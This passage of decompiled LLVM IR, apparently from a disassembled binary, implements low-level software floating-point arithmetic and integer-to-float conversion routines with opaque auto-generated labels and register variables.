dec_label_pc_173a0.dec_label_pc_174e4_crit_edge:  ; preds = %dec_label_pc_173a0
  %.pre = mul i32 %arg2, 2
  br label %dec_label_pc_174e4

bb:                                               ; preds = %dec_label_pc_173a0
  %v3_173b0 = mul i32 %arg2, 2
  store i32 %v3_173b0, i32* %r3.global-to-local, align 4
  %v5_173b0 = icmp eq i32 %v3_173b0, 0
  br i1 %v5_173b0, label %dec_label_pc_174e4, label %bb78

bb78:                                             ; preds = %bb
  %v5_173b4 = icmp eq i32 %v3_173b0, %v2_173ac
  br i1 %v5_173b4, label %dec_label_pc_174e4, label %bb79

bb79:                                             ; preds = %bb78
  %v2_173ac.off = add i32 %v2_173ac, 33554431
  %tmp110 = icmp ult i32 %v2_173ac.off, 16777216
  br i1 %tmp110, label %dec_label_pc_174e4, label %bb80

bb80:                                             ; preds = %bb79
  %v3_173b0.off = add i32 %v3_173b0, 33554431
  %tmp111 = icmp ult i32 %v3_173b0.off, 16777216
  br i1 %tmp111, label %dec_label_pc_174e4, label %dec_label_pc_173c4

dec_label_pc_173c4:                               ; preds = %bb80
  %tmp = udiv i32 %arg1, 8388608
  %v3_173c4 = urem i32 %tmp, 256
  store i32 %v3_173c4, i32* %r2.global-to-local, align 4
  %tmp106 = udiv i32 %arg2, 8388608
  %v4_173c8 = urem i32 %tmp106, 256
  %v5_173c8 = sub nsw i32 %v4_173c8, %v3_173c4
  store i32 %v5_173c8, i32* %r3.global-to-local, align 4
  %v7_173cc = icmp ugt i32 %v4_173c8, %v3_173c4
  br i1 %v7_173cc, label %bb81, label %.thread11

bb81:                                             ; preds = %dec_label_pc_173c4
  store i32 %v4_173c8, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v1_173a0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_173c4, %bb81
  %v5_173dc = icmp ult i32 %v4_173c8, %v3_173c4
  br i1 %v5_173dc, label %bb82, label %bb83

bb82:                                             ; preds = %.thread11
  %v7_173dc = sub nsw i32 0, %v5_173c8
  store i32 %v7_173dc, i32* %r3.global-to-local, align 4
  br label %bb83

bb83:                                             ; preds = %.thread11, %bb82
  %v0_173e0 = phi i32 [ %v5_173c8, %.thread11 ], [ %v7_173dc, %bb82 ]
  %v0_173e4 = load i32, i32* @lr, align 4
  %tmp112 = icmp ugt i32 %v0_173e0, 25
  call void @__pseudo_cond_branch(i1 %tmp112, i32 %v0_173e4)
  %v0_173e8 = load i32, i32* %r0.global-to-local, align 4
  %v3_173e8 = icmp sgt i32 %v0_173e8, -1
  %v1_173ec = urem i32 %v0_173e8, 8388608
  %v1_173f0 = or i32 %v1_173ec, 8388608
  %v2_173f4 = sub nsw i32 0, %v1_173f0
  %v1_173f0.v2_173f4 = select i1 %v3_173e8, i32 %v1_173f0, i32 %v2_173f4
  store i32 %v1_173f0.v2_173f4, i32* %r0.global-to-local, align 4
  %v0_173f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_173f8 = icmp sgt i32 %v0_173f8, -1
  %v1_173fc = urem i32 %v0_173f8, 8388608
  %v1_17400 = or i32 %v1_173fc, 8388608
  %v2_17404 = sub nsw i32 0, %v1_17400
  %storemerge1 = select i1 %v3_173f8, i32 %v1_17400, i32 %v2_17404
  store i32 %storemerge1, i32* %r1.global-to-local, align 4
  %v0_17408 = load i32, i32* %r2.global-to-local, align 4
  %v1_17408 = load i32, i32* %r3.global-to-local, align 4
  %v4_17408 = icmp eq i32 %v1_17408, %v0_17408
  br i1 %v4_17408, label %dec_label_pc_174cc, label %dec_label_pc_17410

dec_label_pc_17410:                               ; preds = %.thread16, %.thread17, %bb83
  %v0_17418 = phi i32 [ %v2_174dc, %.thread17 ], [ %v1_17408, %.thread16 ], [ %v1_17408, %bb83 ]
  %v0_1741c = phi i32 [ %v1_174d0, %.thread17 ], [ %v1_174d0, %.thread16 ], [ %storemerge1, %bb83 ]
  %v0_17414 = phi i32 [ %v1_173f0.v2_173f4, %.thread17 ], [ %v2_174d4, %.thread16 ], [ %v1_173f0.v2_173f4, %bb83 ]
  %v0_17410 = phi i32 [ %v0_17408, %.thread17 ], [ 1, %.thread16 ], [ %v0_17408, %bb83 ]
  %v1_17410 = add i32 %v0_17410, -1
  store i32 %v1_17410, i32* %r2.global-to-local, align 4
  %v7_17414 = ashr i32 %v0_1741c, %v0_17418
  %v8_17414 = add i32 %v7_17414, %v0_17414
  store i32 %v8_17414, i32* %r0.global-to-local, align 4
  %v14_17414 = icmp slt i32 %v8_17414, 0
  %v1_17418 = sub i32 32, %v0_17418
  %v6_1741c = shl i32 %v0_1741c, %v1_17418
  store i32 %v6_1741c, i32* %r1.global-to-local, align 4
  %v1_17420 = and i32 %v8_17414, -2147483648
  store i32 %v1_17420, i32* %r3.global-to-local, align 4
  br i1 %v14_17414, label %dec_label_pc_17428, label %dec_label_pc_17430

dec_label_pc_17428:                               ; preds = %dec_label_pc_17410
  %v1_17428 = sub i32 0, %v6_1741c
  store i32 %v1_17428, i32* %r1.global-to-local, align 4
  %v2_17428 = icmp eq i32 %v6_1741c, 0
  %v2_1742c = icmp eq i1 %v2_17428, false
  %v5_1742c = sext i1 %v2_1742c to i32
  %v6_1742c = sub i32 %v5_1742c, %v8_17414
  store i32 %v6_1742c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17430

dec_label_pc_17430:                               ; preds = %dec_label_pc_17410, %dec_label_pc_17428
  %v0_17468 = phi i32 [ %v6_1741c, %dec_label_pc_17410 ], [ %v1_17428, %dec_label_pc_17428 ]
  %v0_1746c = phi i32 [ %v8_17414, %dec_label_pc_17410 ], [ %v6_1742c, %dec_label_pc_17428 ]
  %v3_17434 = icmp ult i32 %v0_1746c, 8388606
  br i1 %v3_17434, label %dec_label_pc_17468, label %dec_label_pc_17438

dec_label_pc_17438:                               ; preds = %dec_label_pc_17430
  %v3_1743c = icmp ult i32 %v0_1746c, 16777214
  br i1 %v3_1743c, label %dec_label_pc_17454, label %dec_label_pc_17440

dec_label_pc_17440:                               ; preds = %dec_label_pc_17438
  %v1_17440 = urem i32 %v0_1746c, 2
  %v2_17440 = icmp ne i32 %v1_17440, 0
  %v3_17440 = udiv i32 %v0_1746c, 2
  store i32 %v3_17440, i32* %r0.global-to-local, align 4
  %v3_17444 = zext i1 %v2_17440 to i32
  %v6_17444 = zext i32 %v0_17468 to i64
  %v7_17444 = sub i32 33, %v0_17468
  %v8_17444 = zext i32 %v7_17444 to i64
  %v9_17444 = shl i64 %v6_17444, %v8_17444
  %v10_17444 = sub i32 32, %v0_17468
  %v11_17444 = shl i32 %v3_17444, %v10_17444
  %v12_17444 = zext i32 %v11_17444 to i64
  %v14_17444 = or i64 %v12_17444, %v9_17444
  %v15_17444 = trunc i64 %v14_17444 to i32
  store i32 %v15_17444, i32* %r1.global-to-local, align 4
  store i32 %v0_17410, i32* %r2.global-to-local, align 4
  %v2_1744c = icmp ugt i32 %v0_17410, 253
  br i1 %v2_1744c, label %dec_label_pc_17538, label %dec_label_pc_17454

dec_label_pc_17454:                               ; preds = %dec_label_pc_17468, %dec_label_pc_17440, %dec_label_pc_17438
  %v1_17458 = phi i32 [ %v1_17474, %dec_label_pc_17468 ], [ %v0_17410, %dec_label_pc_17440 ], [ %v1_17410, %dec_label_pc_17438 ]
  %v0_17458 = phi i32 [ %v5_1746c, %dec_label_pc_17468 ], [ %v3_17440, %dec_label_pc_17440 ], [ %v0_1746c, %dec_label_pc_17438 ]
  %v2_17458 = and i32 %v1_17458, 512
  %v3_17458 = icmp ne i32 %v2_17458, 0
  %v4_17458 = mul i32 %v1_17458, 8388608
  %v6_17458 = add i32 %v4_17458, %v0_17458
  %v7_17458 = zext i1 %v3_17458 to i32
  %v8_17458 = add i32 %v7_17458, %v6_17458
  %v22_17458 = icmp eq i32 %v8_17458, 0
  br i1 %v22_17458, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_17454
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_17454, %bb84
  %v0_17460 = phi i32 [ 0, %bb84 ], [ %v8_17458, %dec_label_pc_17454 ]
  %v2_17460 = or i32 %v0_17460, %v1_17420
  store i32 %v2_17460, i32* %r0.global-to-local, align 4
  ret i32 %v2_17460

dec_label_pc_17468:                               ; preds = %dec_label_pc_17430
  %v1_17468 = icmp slt i32 %v0_17468, 0
  %v2_17468 = mul i32 %v0_17468, 2
  store i32 %v2_17468, i32* %r1.global-to-local, align 4
  %v3_1746c = mul i32 %v0_1746c, 2
  %v4_1746c = zext i1 %v1_17468 to i32
  %v5_1746c = or i32 %v4_1746c, %v3_1746c
  store i32 %v5_1746c, i32* %r0.global-to-local, align 4
  %v1_17470 = and i32 %v3_1746c, 8388608
  %v2_17470 = icmp eq i32 %v1_17470, 0
  %v1_17474 = add i32 %v0_17410, -2
  store i32 %v1_17474, i32* %r2.global-to-local, align 4
  br i1 %v2_17470, label %dec_label_pc_1747c, label %dec_label_pc_17454

dec_label_pc_1747c:                               ; preds = %dec_label_pc_17468
  %tmp86 = udiv i32 %v0_1746c, 2048
  %v3_1747c = urem i32 %tmp86, 1048576
  %v4_1747c = icmp eq i32 %v3_1747c, 0
  br i1 %v4_1747c, label %bb87, label %.thread12

bb87:                                             ; preds = %dec_label_pc_1747c
  %v4_17480 = mul i32 %v5_1746c, 4096
  store i32 %v4_17480, i32* %r0.global-to-local, align 4
  %v2_17484 = add i32 %v0_17410, -14
  store i32 %v2_17484, i32* %r2.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1747c, %bb87
  %v1_17490 = phi i32 [ %v1_17474, %dec_label_pc_1747c ], [ %v2_17484, %bb87 ]
  %v1_1748c = phi i32 [ %v5_1746c, %dec_label_pc_1747c ], [ %v4_17480, %bb87 ]
  %v1_17488 = and i32 %v1_1748c, 16711680
  %v2_17488 = icmp eq i32 %v1_17488, 0
  br i1 %v2_17488, label %bb88, label %.thread13

bb88:                                             ; preds = %.thread12
  %v4_1748c = mul i32 %v1_1748c, 256
  store i32 %v4_1748c, i32* %r0.global-to-local, align 4
  %v2_17490 = add i32 %v1_17490, -8
  store i32 %v2_17490, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread12, %bb88
  %v1_1749c = phi i32 [ %v1_17490, %.thread12 ], [ %v2_17490, %bb88 ]
  %v1_17498 = phi i32 [ %v1_1748c, %.thread12 ], [ %v4_1748c, %bb88 ]
  %v1_17494 = and i32 %v1_17498, 15728640
  %v2_17494 = icmp eq i32 %v1_17494, 0
  br i1 %v2_17494, label %bb89, label %.thread14

bb89:                                             ; preds = %.thread13
  %v4_17498 = mul i32 %v1_17498, 16
  store i32 %v4_17498, i32* %r0.global-to-local, align 4
  %v2_1749c = add i32 %v1_1749c, -4
  store i32 %v2_1749c, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %.thread13, %bb89
  %v1_174a8 = phi i32 [ %v1_1749c, %.thread13 ], [ %v2_1749c, %bb89 ]
  %v1_174a4 = phi i32 [ %v1_17498, %.thread13 ], [ %v4_17498, %bb89 ]
  %v1_174a0 = and i32 %v1_174a4, 12582912
  %v2_174a0 = icmp eq i32 %v1_174a0, 0
  br i1 %v2_174a0, label %bb90, label %.thread15

bb90:                                             ; preds = %.thread14
  %v4_174a4 = mul i32 %v1_174a4, 4
  store i32 %v4_174a4, i32* %r0.global-to-local, align 4
  %v2_174a8 = add i32 %v1_174a8, -2
  store i32 %v2_174a8, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread14, %bb90
  %v0_174b4 = phi i32 [ %v1_174a8, %.thread14 ], [ %v2_174a8, %bb90 ]
  %v1_174b0 = phi i32 [ %v1_174a4, %.thread14 ], [ %v4_174a4, %bb90 ]
  %v2_174ac = icmp ugt i32 %v1_174b0, 8388607
  br i1 %v2_174ac, label %bb92, label %bb91

bb91:                                             ; preds = %.thread15
  %v3_174b0 = mul i32 %v1_174b0, 2
  store i32 %v3_174b0, i32* %r0.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread15, %bb91
  %v3_174b8 = phi i32 [ %v1_174b0, %.thread15 ], [ %v3_174b0, %bb91 ]
  %v1_174b4 = phi i32 [ 0, %.thread15 ], [ 1, %bb91 ]
  %v4_174b4 = sub i32 %v0_174b4, %v1_174b4
  store i32 %v4_174b4, i32* %r2.global-to-local, align 4
  %v7_174b4107 = sub i32 %v1_174b4, %v4_174b4
  %v9_174b4 = and i32 %v7_174b4107, %v0_174b4
  %v10_174b4 = icmp slt i32 %v9_174b4, 0
  %v11_174b4 = icmp slt i32 %v4_174b4, 0
  %v2_174b8 = xor i1 %v11_174b4, %v10_174b4
  br i1 %v2_174b8, label %.thread75, label %bb93

.thread75:                                        ; preds = %bb92
  %v4_174bc = sub i32 0, %v4_174b4
  store i32 %v4_174bc, i32* %r2.global-to-local, align 4
  %v10_174c4 = lshr i32 %v3_174b8, %v4_174bc
  %v11_174c4 = or i32 %v10_174c4, %v1_17420
  store i32 %v11_174c4, i32* %r0.global-to-local, align 4
  br label %bb94

bb93:                                             ; preds = %bb92
  %v7_174b86672 = mul i32 %v4_174b4, 8388608
  %v8_174b86773 = add i32 %v7_174b86672, %v3_174b8
  %v5_174c0 = or i32 %v8_174b86773, %v1_17420
  store i32 %v5_174c0, i32* %r0.global-to-local, align 4
  br label %bb94

bb94:                                             ; preds = %.thread24, %bb105, %bb99, %dec_label_pc_1751c, %bb96, %dec_label_pc_174fc, %bb93, %.thread75
  %v1_174c8 = phi i32 [ %v5_174c0, %bb93 ], [ %v11_174c4, %.thread75 ], [ %v1_173a0, %dec_label_pc_174fc ], [ %arg2, %bb96 ], [ %v2_1751c, %dec_label_pc_1751c ], [ %v2_17520, %bb99 ], [ %v1_17560, %bb105 ], [ %v2_17560, %.thread24 ]
  ret i32 %v1_174c8

dec_label_pc_174cc:                               ; preds = %bb83
  %v2_174cc = icmp eq i32 %v0_17408, 0
  %v1_174d0 = xor i32 %storemerge1, 8388608
  store i32 %v1_174d0, i32* %r1.global-to-local, align 4
  br i1 %v2_174cc, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_174cc
  %v2_174d4 = xor i32 %v1_173f0.v2_173f4, 8388608
  store i32 %v2_174d4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17410

.thread17:                                        ; preds = %dec_label_pc_174cc
  %v2_174dc = add i32 %v1_17408, -1
  store i32 %v2_174dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17410

dec_label_pc_174e4:                               ; preds = %dec_label_pc_173a0.dec_label_pc_174e4_crit_edge, %bb, %bb78, %bb79, %bb80
  %v2_174e4.pre-phi = phi i32 [ %.pre, %dec_label_pc_173a0.dec_label_pc_174e4_crit_edge ], [ 0, %bb ], [ %v3_173b0, %bb78 ], [ %v3_173b0, %bb79 ], [ %v3_173b0, %bb80 ]
  store i32 %v2_174e4.pre-phi, i32* %r3.global-to-local, align 4
  %v3_174e8 = sdiv i32 %v2_173ac, 16777216
  %v4_174e8 = sub nsw i32 -1, %v3_174e8
  %v2_173ac.off108 = add i32 %v2_173ac, 33554431
  %tmp113 = icmp ult i32 %v2_173ac.off108, 16777216
  br i1 %tmp113, label %.thread21, label %bb95

bb95:                                             ; preds = %dec_label_pc_174e4
  %v2_174e4.pre-phi.off = add i32 %v2_174e4.pre-phi, 33554431
  %tmp114 = icmp ult i32 %v2_174e4.pre-phi.off, 16777216
  br i1 %tmp114, label %bb102, label %dec_label_pc_174f4

dec_label_pc_174f4:                               ; preds = %bb95
  %v4_174f4 = icmp eq i32 %v2_174e4.pre-phi, %v2_173ac
  br i1 %v4_174f4, label %dec_label_pc_17508, label %dec_label_pc_174fc

dec_label_pc_174fc:                               ; preds = %dec_label_pc_174f4
  br i1 %v4_173ac, label %bb96, label %bb94

bb96:                                             ; preds = %dec_label_pc_174fc
  store i32 %arg2, i32* %r0.global-to-local, align 4
  br label %bb94

dec_label_pc_17508:                               ; preds = %dec_label_pc_174f4
  %v4_17508 = icmp eq i32 %v1_173a0, %arg2
  br i1 %v4_17508, label %bb98, label %bb97

bb97:                                             ; preds = %dec_label_pc_17508
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb98

bb98:                                             ; preds = %dec_label_pc_17508, %bb97
  %v0_17510 = load i32, i32* @lr, align 4
  %v2_17510 = xor i1 %v4_17508, true
  call void @__pseudo_cond_branch(i1 %v2_17510, i32 %v0_17510)
  %v0_17514 = load i32, i32* %r2.global-to-local, align 4
  %v3_17514 = icmp ult i32 %v0_17514, 16777216
  br i1 %v3_17514, label %dec_label_pc_1751c, label %dec_label_pc_17528

dec_label_pc_1751c:                               ; preds = %bb98
  %v0_1751c = load i32, i32* %r0.global-to-local, align 4
  %v1_1751c = icmp slt i32 %v0_1751c, 0
  %v2_1751c = mul i32 %v0_1751c, 2
  store i32 %v2_1751c, i32* %r0.global-to-local, align 4
  br i1 %v1_1751c, label %bb99, label %bb94

bb99:                                             ; preds = %dec_label_pc_1751c
  %v2_17520 = or i32 %v2_1751c, -2147483648
  store i32 %v2_17520, i32* %r0.global-to-local, align 4
  br label %bb94

dec_label_pc_17528:                               ; preds = %bb98
  %v1_17528 = add i32 %v0_17514, 33554432
  store i32 %v1_17528, i32* %r2.global-to-local, align 4
  %v2_17528 = icmp ugt i32 %v0_17514, -33554433
  br i1 %v2_17528, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_17528
  %v1_1752c = load i32, i32* %r0.global-to-local, align 4
  %v2_1752c = add i32 %v1_1752c, 8388608
  store i32 %v2_1752c, i32* %r0.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_17528, %bb100
  %v0_17530 = load i32, i32* @lr, align 4
  %v2_17530 = xor i1 %v2_17528, true
  call void @__pseudo_cond_branch(i1 %v2_17530, i32 %v0_17530)
  %v0_17534 = load i32, i32* %r0.global-to-local, align 4
  %v1_17534 = and i32 %v0_17534, -2147483648
  store i32 %v1_17534, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17538

dec_label_pc_17538:                               ; preds = %dec_label_pc_17440, %bb101
  %v0_17538 = phi i32 [ %v1_17420, %dec_label_pc_17440 ], [ %v1_17534, %bb101 ]
  %v1_1753c = or i32 %v0_17538, 2139095040
  store i32 %v1_1753c, i32* %r0.global-to-local, align 4
  ret i32 %v1_1753c

bb102:                                            ; preds = %bb95
  store i32 %v4_174e8, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread21:                                        ; preds = %dec_label_pc_174e4
  store i32 %v4_174e8, i32* %r2.global-to-local, align 4
  %v4_1754c = sdiv i32 %v2_174e4.pre-phi, 16777216
  %v5_1754c = sub nsw i32 -1, %v4_1754c
  store i32 %v5_1754c, i32* %r3.global-to-local, align 4
  %v2_174e4.pre-phi.off109 = add i32 %v2_174e4.pre-phi, 33554431
  %tmp115 = icmp ult i32 %v2_174e4.pre-phi.off109, 16777216
  br i1 %tmp115, label %bb103, label %.thread22

.thread22:                                        ; preds = %bb102, %.thread21
  %v1_17550 = phi i32 [ %arg2, %bb102 ], [ %v1_173a0, %.thread21 ]
  store i32 %v1_17550, i32* %r1.global-to-local, align 4
  br label %bb103

bb103:                                            ; preds = %.thread21, %.thread22
  %v2_1755c = phi i32 [ %arg2, %.thread21 ], [ %v1_17550, %.thread22 ]
  %v1_17560 = phi i32 [ %v1_173a0, %.thread21 ], [ %v1_17550, %.thread22 ]
  %v3_17554 = mul i32 %v1_17560, 512
  store i32 %v3_17554, i32* %r2.global-to-local, align 4
  %v5_17554 = icmp eq i32 %v3_17554, 0
  br i1 %v5_17554, label %bb104, label %.thread24

bb104:                                            ; preds = %bb103
  %v4_17558 = mul i32 %v2_1755c, 512
  store i32 %v4_17558, i32* %r3.global-to-local, align 4
  %v6_17558 = icmp eq i32 %v4_17558, 0
  br i1 %v6_17558, label %bb105, label %.thread24

bb105:                                            ; preds = %bb104
  %v5_1755c = icmp eq i32 %v1_17560, %v2_1755c
  br i1 %v5_1755c, label %bb94, label %.thread24

.thread24:                                        ; preds = %bb103, %bb104, %bb105
  %v2_17560 = or i32 %v1_17560, 4194304
  store i32 %v2_17560, i32* %r0.global-to-local, align 4
  br label %bb94

; uselistorder directives
  uselistorder i32 %v2_17560, { 1, 0 }
  uselistorder i32 %v4_17558, { 1, 0 }
  uselistorder i32 %v3_17554, { 1, 0 }
  uselistorder i32 %v1_17560, { 3, 0, 1, 2 }
  uselistorder i32 %v1_17550, { 1, 0, 2 }
  uselistorder i32 %v2_17520, { 1, 0 }
  uselistorder i32 %v2_1751c, { 1, 0, 2 }
  uselistorder i32 %v0_17514, { 2, 1, 0 }
  uselistorder i1 %v4_17508, { 1, 0 }
  uselistorder i32 %v4_174e8, { 1, 0 }
  uselistorder i32 %v2_174e4.pre-phi, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v2_174dc, { 1, 0 }
  uselistorder i32 %v2_174d4, { 1, 0 }
  uselistorder i32 %v1_174d0, { 2, 1, 0 }
  uselistorder i32 %v4_174b4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_174b4, { 1, 0 }
  uselistorder i32 %v3_174b0, { 1, 0 }
  uselistorder i32 %v1_174b0, { 1, 0, 2 }
  uselistorder i32 %v4_174a4, { 1, 0 }
  uselistorder i32 %v1_174a4, { 1, 0, 2 }
  uselistorder i32 %v4_17498, { 1, 0 }
  uselistorder i32 %v1_17498, { 1, 0, 2 }
  uselistorder i32 %v4_1748c, { 1, 0 }
  uselistorder i32 %v1_1748c, { 1, 0, 2 }
  uselistorder i32 %v4_17480, { 1, 0 }
  uselistorder i32 %v1_17474, { 0, 2, 1 }
  uselistorder i32 %v5_1746c, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1746c, { 1, 0 }
  uselistorder i32 %v3_17440, { 1, 0 }
  uselistorder i32 %v0_1746c, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v0_17468, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_17420, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_1741c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17410, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_17408, { 3, 1, 2, 0 }
  uselistorder i32 %v0_17408, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v1_173f0.v2_173f4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_173c8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_173b0, { 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_173ac, { 0, 2, 4, 3, 1, 6, 5 }
  uselistorder i32 %v1_173a0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 0, 18, 1, 2, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 23, 4, 24, 5, 6, 25, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 26, 22, 27 }
  uselistorder i32 33554432, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 8388607, { 1, 0, 2 }
  uselistorder i32 4096, { 0, 8, 1, 2, 3, 9, 13, 5, 6, 14, 10, 15, 4, 11, 16, 12, 7 }
  uselistorder i32 2048, { 0, 17, 18, 11, 16, 15, 8, 9, 1, 2, 3, 4, 10, 6, 12, 13, 5, 7, 14, 19 }
  uselistorder i32 512, { 0, 1, 9, 8, 2, 3, 10, 4, 11, 5, 12, 6, 13, 7, 14 }
  uselistorder i32 253, { 3, 0, 1, 2 }
  uselistorder i32 33, { 12, 6, 16, 1, 0, 2, 3, 4, 7, 13, 15, 5, 8, 14, 9, 17, 10, 18, 11, 19 }
  uselistorder i32 25, { 0, 19, 20, 3, 11, 4, 12, 5, 13, 6, 14, 10, 1, 7, 15, 2, 16, 8, 17, 9, 18, 21 }
  uselistorder i32 8388608, { 11, 12, 13, 5, 14, 0, 6, 1, 7, 2, 3, 4, 8, 15, 9, 10 }
  uselistorder i32 %arg2, { 5, 6, 7, 0, 8, 4, 9, 1, 2, 3, 10 }
  uselistorder label %.thread24, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_17538, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_174e4, { 4, 3, 2, 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %dec_label_pc_17430, { 1, 0 }
  uselistorder label %dec_label_pc_17410, { 1, 0, 2 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
}

define i32 @function_17568() local_unnamed_addr {
dec_label_pc_17568:
  store i32 0, i32* @r3, align 4
  %v0_1756c = call i32 @function_17578()
  ret i32 %v0_1756c
}

define i32 @function_17570() local_unnamed_addr {
dec_label_pc_17570:
  %v0_17570 = load i32, i32* @r0, align 4
  %v2_17570 = icmp slt i32 %v0_17570, 0
  br i1 %v2_17570, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_17570
  %v2_17574 = sub i32 0, %v0_17570
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_17570, %bb
  %.0 = phi i32 [ %v2_17574, %bb ], [ undef, %dec_label_pc_17570 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_17570, { 1, 0 }
  uselistorder i32 undef, { 4, 1, 2, 3, 0, 5 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_17578() local_unnamed_addr {
dec_label_pc_17578:
  %ip.global-to-local = alloca i32, align 4
  %v0_17578 = load i32, i32* @r0, align 4
  store i32 %v0_17578, i32* %ip.global-to-local, align 4
  %v2_17578 = icmp eq i32 %v0_17578, 0
  %v0_1757c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17578, i32 %v0_1757c)
  %v0_17580 = load i32, i32* @r3, align 4
  %v1_17580 = or i32 %v0_17580, 1258291200
  %v0_17584 = load i32, i32* @r0, align 4
  %v1_175d0 = add i32 %v1_17580, -8388608
  %v0_175d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_175d8 = icmp ugt i32 %v0_175d8, 65535
  br i1 %v2_175d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17578
  %v2_175dc = and i32 %v0_175d8, 32768
  %v3_175dc = icmp eq i32 %v2_175dc, 0
  %v4_175dc = udiv i32 %v0_175d8, 65536
  store i32 %v4_175dc, i32* %ip.global-to-local, align 4
  br i1 %v3_175dc, label %.thread, label %bb14

bb14:                                             ; preds = %bb
  br label %.thread

.thread:                                          ; preds = %bb, %dec_label_pc_17578, %bb14
  %v1_175e8 = phi i32 [ %v0_175d8, %dec_label_pc_17578 ], [ %v4_175dc, %bb ], [ %v4_175dc, %bb14 ]
  %v1_175ec = phi i32 [ 23, %dec_label_pc_17578 ], [ 23, %bb ], [ 7, %bb14 ]
  %v2_175e4 = icmp ugt i32 %v1_175e8, 255
  br i1 %v2_175e4, label %bb15, label %.thread1

bb15:                                             ; preds = %.thread
  %v2_175e8 = and i32 %v1_175e8, 128
  %v3_175e8 = icmp eq i32 %v2_175e8, 0
  %v4_175e8 = udiv i32 %v1_175e8, 256
  store i32 %v4_175e8, i32* %ip.global-to-local, align 4
  br i1 %v3_175e8, label %.thread1, label %bb16

bb16:                                             ; preds = %bb15
  %v2_175ec = add nsw i32 %v1_175ec, -8
  br label %.thread1

.thread1:                                         ; preds = %bb15, %.thread, %bb16
  %v1_175f8 = phi i32 [ %v1_175ec, %.thread ], [ %v1_175ec, %bb15 ], [ %v2_175ec, %bb16 ]
  %v1_175f4 = phi i32 [ %v1_175e8, %.thread ], [ %v4_175e8, %bb15 ], [ %v4_175e8, %bb16 ]
  %v2_175f0 = icmp ugt i32 %v1_175f4, 15
  br i1 %v2_175f0, label %bb17, label %.thread2

bb17:                                             ; preds = %.thread1
  %v2_175f4 = and i32 %v1_175f4, 8
  %v3_175f4 = icmp eq i32 %v2_175f4, 0
  %v4_175f4 = udiv i32 %v1_175f4, 16
  store i32 %v4_175f4, i32* %ip.global-to-local, align 4
  br i1 %v3_175f4, label %.thread2, label %bb18

bb18:                                             ; preds = %bb17
  %v2_175f8 = add nsw i32 %v1_175f8, -4
  br label %.thread2

.thread2:                                         ; preds = %bb17, %.thread1, %bb18
  %v1_17600 = phi i32 [ %v1_175f8, %.thread1 ], [ %v1_175f8, %bb17 ], [ %v2_175f8, %bb18 ]
  %v1_17608 = phi i32 [ %v1_175f4, %.thread1 ], [ %v4_175f4, %bb17 ], [ %v4_175f4, %bb18 ]
  %v2_175fc = icmp ugt i32 %v1_17608, 3
  br i1 %v2_175fc, label %bb19, label %.thread3

bb19:                                             ; preds = %.thread2
  %v2_17600 = add nsw i32 %v1_17600, -2
  br label %bb20

.thread3:                                         ; preds = %.thread2
  %v5_17604 = udiv i32 %v1_17608, 2
  %v6_17604 = sub i32 %v1_17600, %v5_17604
  br label %bb20
